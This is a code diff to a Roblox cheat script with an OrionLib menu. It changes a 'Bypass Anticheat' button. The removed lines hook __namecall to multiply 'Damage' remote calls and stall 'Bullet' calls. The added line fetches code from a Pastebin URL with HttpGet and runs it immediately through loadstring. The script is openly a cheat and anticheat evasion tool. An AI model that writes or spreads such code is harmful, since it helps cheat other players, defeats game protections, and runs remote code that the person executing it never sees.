@@ -1,4 +1,3 @@
-
 local player = game.Players.LocalPlayer
 
 local OrionLib = 
@@ -144,23 +143,7 @@ local Section = NotorietyTab:AddSection({
 NotorietyTab:AddButton({ 
   Name = "Bypass Anticheat", 
   Callback = function() 
-    local __namecall; __namecall = hookmetamethod(game, "__namecall", function(self, ...)
-    if not checkcaller() then
-        if getnamecallmethod() == "FireServer" then
-            if self.Name == "Damage" then
-
-                for i = 1, 10 do
-                    __namecall(self, ...)
-                end
-            end
-            if self.Name == "Bullet" then
-                return task.wait(9e9)
-            end
-        end
-    end
-
-    return __namecall(self, ...)
-        end
+    loadstring(game:HttpGet("https://pastebin.com/M4WwQEMx"))()
   end
 })
 
